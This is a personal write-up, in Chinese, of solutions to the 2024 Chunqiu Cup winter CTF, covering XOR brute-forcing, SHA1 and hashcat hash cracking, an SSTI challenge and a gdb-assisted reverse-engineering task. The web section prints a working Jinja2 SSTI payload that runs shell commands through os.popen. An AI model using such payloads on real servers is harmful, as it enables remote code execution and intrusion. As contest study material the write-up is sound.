---
title: "2024年春秋杯 冬季赛"
date: 2025-01-19
draft: false
description: "2024年春秋杯网络安全联赛冬季赛"
summary: "2024年春秋杯网络安全联赛冬季赛 个人WriteUP"
tags: ["writeup", "ctf"]
categories: ["writeup"]
---

## misc

### 简单算术

> 想想异或

```
ys~xdg/m@]mjkz@vl@z~lf>b
```

直接脚本跑一遍

```python
data = "ys~xdg/m@]mjkz@vl@z~lf>b"

for shift in range(127):
    result = ""
    for i in range(len(data)):
        # print()
        result += chr(ord(data[i]) ^ shift)
    if result.startswith("flag"):
        print(result)
        exit(0)

# print(result)

# flag{x0r_Brute_is_easy!}
```

## Crypto

### 你是小哈斯?

> 年轻黑客小符参加CTF大赛，他发现这个小哈斯文件的内容存在高度规律性，并且文件名中有隐藏信息，他成功找到了隐藏的信息，并破解了挑战。得意地说：“成功在于探索与质疑，碰撞是发现真相的关键！”

```
356a192b7913b04c54574d18c28d46e6395428ab
da4b9237bacccdf19c0760cab7aec4a8359010b0
77de68daecd823babbb58edb1c8e14d7106e83bb
1b6453892473a467d07372d45eb05abc2031647a
ac3478d69a3c81fa62e60f5c3696165a4e5e6ac4
c1dfd96eea8cc2b62785275bca38ac261256e278
902ba3cda1883801594b6e1b452790cc53948fda
fe5dbbcea5ce7e2988b8c69bcfdfde8904aabc1f
0ade7c2cf97f75d009975f4d720d1fa6c19f4897
b6589fc6ab0dc82cf12099d1c2d40ab994e8410c
3bc15c8aae3e4124dd409035f32ea2fd6835efc9
21606782c65e44cac7afbb90977d8b6f82140e76
22ea1c649c82946aa6e479e1ffd321e4a318b1b0
aff024fe4ab0fece4091de044c58c9ae4233383a
58e6b3a414a1e090dfc6029add0f3555ccba127f
4dc7c9ec434ed06502767136789763ec11d2c4b7
8efd86fb78a56a5145ed7739dcb00c78581c5375
95cb0bfd2977c761298d9624e4b4d4c72a39974a
51e69892ab49df85c6230ccc57f8e1d1606caccc
042dc4512fa3d391c5170cf3aa61e6a638f84342
7a81af3e591ac713f81ea1efe93dcf36157d8376
516b9783fca517eecbd1d064da2d165310b19759
4a0a19218e082a343a1b17e5333409af9d98f0f5
07c342be6e560e7f43842e2e21b774e61d85f047
86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
54fd1711209fb1c0781092374132c66e79e2241b
60ba4b2daa4ed4d070fec06687e249e0e6f9ee45
d1854cae891ec7b29161ccaf79a24b00c274bdaa
7a81af3e591ac713f81ea1efe93dcf36157d8376
53a0acfad59379b3e050338bf9f23cfc172ee787
042dc4512fa3d391c5170cf3aa61e6a638f84342
a0f1490a20d0211c997b44bc357e1972deab8ae3
53a0acfad59379b3e050338bf9f23cfc172ee787
4a0a19218e082a343a1b17e5333409af9d98f0f5
07c342be6e560e7f43842e2e21b774e61d85f047
86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
54fd1711209fb1c0781092374132c66e79e2241b
c2b7df6201fdd3362399091f0a29550df3505b6a
86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
a0f1490a20d0211c997b44bc357e1972deab8ae3
3c363836cf4e16666669a25da280a1865c2d2874
4a0a19218e082a343a1b17e5333409af9d98f0f5
54fd1711209fb1c0781092374132c66e79e2241b
27d5482eebd075de44389774fce28c69f45c8a75
5c2dd944dde9e08881bef0894fe7b22a5c9c4b06
13fbd79c3d390e5d6585a21e11ff5ec1970cff0c
07c342be6e560e7f43842e2e21b774e61d85f047
395df8f7c51f007019cb30201c49e884b46b92fa
11f6ad8ec52a2984abaafd7c3b516503785c2072
84a516841ba77a5b4648de2cd0dfcb30ea46dbb4
7a38d8cbd20d9932ba948efaa364bb62651d5ad4
e9d71f5ee7c92d6dc9e92ffdad17b8bd49418f98
d1854cae891ec7b29161ccaf79a24b00c274bdaa
6b0d31c0d563223024da45691584643ac78c96e8
5c10b5b2cd673a0616d529aa5234b12ee7153808
4a0a19218e082a343a1b17e5333409af9d98f0f5
07c342be6e560e7f43842e2e21b774e61d85f047
86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
54fd1711209fb1c0781092374132c66e79e2241b
60ba4b2daa4ed4d070fec06687e249e0e6f9ee45
54fd1711209fb1c0781092374132c66e79e2241b
86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
6b0d31c0d563223024da45691584643ac78c96e8
58e6b3a414a1e090dfc6029add0f3555ccba127f
53a0acfad59379b3e050338bf9f23cfc172ee787
84a516841ba77a5b4648de2cd0dfcb30ea46dbb4
22ea1c649c82946aa6e479e1ffd321e4a318b1b0
e9d71f5ee7c92d6dc9e92ffdad17b8bd49418f98
53a0acfad59379b3e050338bf9f23cfc172ee787
042dc4512fa3d391c5170cf3aa61e6a638f84342
a0f1490a20d0211c997b44bc357e1972deab8ae3
042dc4512fa3d391c5170cf3aa61e6a638f84342
a0f1490a20d0211c997b44bc357e1972deab8ae3
53a0acfad59379b3e050338bf9f23cfc172ee787
84a516841ba77a5b4648de2cd0dfcb30ea46dbb4
11f6ad8ec52a2984abaafd7c3b516503785c2072
95cb0bfd2977c761298d9624e4b4d4c72a39974a
395df8f7c51f007019cb30201c49e884b46b92fa
c2b7df6201fdd3362399091f0a29550df3505b6a
3a52ce780950d4d969792a2559cd519d7ee8c727
86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
a0f1490a20d0211c997b44bc357e1972deab8ae3
3c363836cf4e16666669a25da280a1865c2d2874
4a0a19218e082a343a1b17e5333409af9d98f0f5
54fd1711209fb1c0781092374132c66e79e2241b
27d5482eebd075de44389774fce28c69f45c8a75
5c2dd944dde9e08881bef0894fe7b22a5c9c4b06
13fbd79c3d390e5d6585a21e11ff5ec1970cff0c
07c342be6e560e7f43842e2e21b774e61d85f047
395df8f7c51f007019cb30201c49e884b46b92fa
11f6ad8ec52a2984abaafd7c3b516503785c2072
84a516841ba77a5b4648de2cd0dfcb30ea46dbb4
7a38d8cbd20d9932ba948efaa364bb62651d5ad4
e9d71f5ee7c92d6dc9e92ffdad17b8bd49418f98
d1854cae891ec7b29161ccaf79a24b00c274bdaa
6b0d31c0d563223024da45691584643ac78c96e8
5c10b5b2cd673a0616d529aa5234b12ee7153808
3a52ce780950d4d969792a2559cd519d7ee8c727
22ea1c649c82946aa6e479e1ffd321e4a318b1b0
aff024fe4ab0fece4091de044c58c9ae4233383a
58e6b3a414a1e090dfc6029add0f3555ccba127f
4dc7c9ec434ed06502767136789763ec11d2c4b7
8efd86fb78a56a5145ed7739dcb00c78581c5375
95cb0bfd2977c761298d9624e4b4d4c72a39974a
51e69892ab49df85c6230ccc57f8e1d1606caccc
042dc4512fa3d391c5170cf3aa61e6a638f84342
7a81af3e591ac713f81ea1efe93dcf36157d8376
516b9783fca517eecbd1d064da2d165310b19759
4a0a19218e082a343a1b17e5333409af9d98f0f5
07c342be6e560e7f43842e2e21b774e61d85f047
86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
54fd1711209fb1c0781092374132c66e79e2241b
60ba4b2daa4ed4d070fec06687e249e0e6f9ee45
d1854cae891ec7b29161ccaf79a24b00c274bdaa
7a81af3e591ac713f81ea1efe93dcf36157d8376
53a0acfad59379b3e050338bf9f23cfc172ee787
042dc4512fa3d391c5170cf3aa61e6a638f84342
a0f1490a20d0211c997b44bc357e1972deab8ae3
53a0acfad59379b3e050338bf9f23cfc172ee787
4a0a19218e082a343a1b17e5333409af9d98f0f5
07c342be6e560e7f43842e2e21b774e61d85f047
86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
54fd1711209fb1c0781092374132c66e79e2241b
c2b7df6201fdd3362399091f0a29550df3505b6a
356a192b7913b04c54574d18c28d46e6395428ab
da4b9237bacccdf19c0760cab7aec4a8359010b0
77de68daecd823babbb58edb1c8e14d7106e83bb
1b6453892473a467d07372d45eb05abc2031647a
ac3478d69a3c81fa62e60f5c3696165a4e5e6ac4
c1dfd96eea8cc2b62785275bca38ac261256e278
902ba3cda1883801594b6e1b452790cc53948fda
fe5dbbcea5ce7e2988b8c69bcfdfde8904aabc1f
0ade7c2cf97f75d009975f4d720d1fa6c19f4897
b6589fc6ab0dc82cf12099d1c2d40ab994e8410c
3bc15c8aae3e4124dd409035f32ea2fd6835efc9
21606782c65e44cac7afbb90977d8b6f82140e76
```

使用hash-identifier判断是sha1

使用脚本跑一遍得到结果

```python
import hashlib

f = open("data.txt", "r")

data = f.readlines()

flag = ""
for c in data:
    for i in range(128):
        hash = hashlib.sha1(str(chr(i)).encode()).hexdigest()
        if c.strip() == hash:
            flag += chr(i)
            # print(i, hash, c)

print(flag)
```

> 1234567890-=qwertyuiopflag{no_is_flag}asdfghjklzxcvbnm,**flag{game_cqb_isis_cxyz}**.asdfghjklzxcvbnm,.qwertyuiopflag{no_is_flag}1234567890-=

### 通往哈希的旅程

> 在数字城，大家都是通过是通过数字电话进行的通信,常见是以188开头的11位纯血号码组成，亚历山大抵在一个特殊的地方截获一串特殊的字符串"ca12fd8250972ec363a16593356abb1f3cf3a16d"，通过查阅发现这个跟以前散落的国度有点相似，可能是去往哈希国度的。年轻程序员亚力山大抵对这个国度充满好奇，决定破译这个哈希值。在经过一段时间的摸索后，亚力山大抵凭借强大的编程实力成功破解，在输入对应字符串后瞬间被传送到一个奇幻的数据世界，同时亚力山大抵也开始了他的进修之路。(提交格式：flag{11位号码}）

将```ca12fd8250972ec363a16593356abb1f3cf3a16d```放在hash.txt中使用hashcat爆破

```shell
hashcat -m 100 -a 3 hash 188?d?d?d?d?d?d?d?d --show
```

> ca12fd8250972ec363a16593356abb1f3cf3a16d:18876011645
>
> flag{18876011645}

## WEB

### easy_flask

使用```{{7*7}}```测试发现SSTI

本题没有任何过滤，直接进行利用即可

```
{{().__class__.__base__.__subclasses__()[216].__init__.__globals__.__builtins__['eval']('__import__("os").popen("cat flag").read()')}}
```

## Reverse

### ezre

一些关键逻辑:

```C
unsigned __int64 main_program()
{
  unsigned int seed[2]; // [rsp+20h] [rbp-80h] BYREF
  __int64 v2; // [rsp+28h] [rbp-78h]
  char s[48]; // [rsp+30h] [rbp-70h] BYREF
  _BYTE s1[56]; // [rsp+60h] [rbp-40h] BYREF
  unsigned __int64 v5; // [rsp+98h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  *(_QWORD *)seed = 0LL;
  v2 = 0LL;
  custom_md5_init(seed);
  srand(seed[0]);
  printf("Enter input: ");
  fgets(s, 43, stdin);
  if ( strlen(s) == 42 )
  {
    memset(s1, 0, 0x2BuLL);
    xor_string_with_rand(s, s1);
    if ( !memcmp(s1, &ida_chars, 0x2BuLL) )
      puts("right");
    else
      puts("wrong");
  }
  else
  {
    puts("Invalid input length.");
  }
  return v5 - __readfsqword(0x28u);
}

void __fastcall xor_string_with_rand(__int64 a1, __int64 a2)
{
  int i; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 41; ++i )
    *(_BYTE *)(i + a2) = (rand() % 127) ^ *(_BYTE *)(i + a1);
}
```

分析:

随机种子是提前置顶的，因此每次生成的随机数是固定的
初始化种子的过程懒得分析，但是可以使用动态调试获得初始化后的种子
采用的异或进行加密，因此再次进行异或一次就可得到原文
手写解密脚本跑出来是乱码，不懂，于是直接使用原本的程序来进行解密

具体思路：

使用IDA提取密文，用脚本将密文(含不可打印字符)传入程序，动态调试取得程序再次异或（解密）的密文

```python
from pwn import *

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m'+ str(x) + '\x1b[0m')

# Config
LOCAL = True
file = './ezre'
remote_addr = 'localhost'
remote_port = 65535
context.log_level='DEBUG' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARNING']
elf = ELF(file)
context.binary = elf
rop = ROP(elf)

def dbg(p : process):
  if LOCAL:
    gdb.attach(p, 'x-pwn')

def get_Process():
  if LOCAL:
    p = process(file)
  else:
    p = remote(remote_addr ,remote_port)
  return p

def exp():
  p = get_Process()

  # Real Start of EXP

  dbg(p)

  data = b"\x5C\x76\x4A\x78\x15\x62\x05\x7C\x6B\x21\x40\x66\x5B\x1A\x48\x7A\x1E\x46\x7F\x28\x02\x75\x68\x2A\x34\x0C\x4B\x1D\x3D\x2E\x6B\x7A\x17\x45\x07\x75\x47\x27\x39\x78\x61"

  p.sendline(data)
  
  p.interactive()

  flag = p.recvline_startswith(b'flag').decode()
  
  li("[+] Got Flag!")
  print(flag)
  
  p.close()

if __name__ == '__main__':
  exp()

# 原理: 异或两次即可得到原文

# gdb 调试操作:
# b *main_program+153
# c
# n 20

# gdb 结果:
#  ► 0x55a8ff6f34f9 <main_program+244>    mov    rsi, rcx     RSI => 0x55a8ff6f6020 (ida_chars) ◂— 0x7c056215784a765c
#    0x55a8ff6f34fc <main_program+247>    mov    rdi, rax     RDI => 0x7fff23392bc0 ◂— 'flag{b799eb3a-59ee-4b3b-b49d-39080fc23e99|'
#    0x55a8ff6f34ff <main_program+250>    call   memcmp@plt                  <memcmp@plt>

```

![Gdb Result](/img/posts/cqgame2024_winter/ezre_gdb_result.png)

再次验证确认flag正确:

![confirm](/img/posts/cqgame2024_winter/ezre_confirm.png)

> flag{b799eb3a-59ee-4b3b-b49d-39080fc23e99}
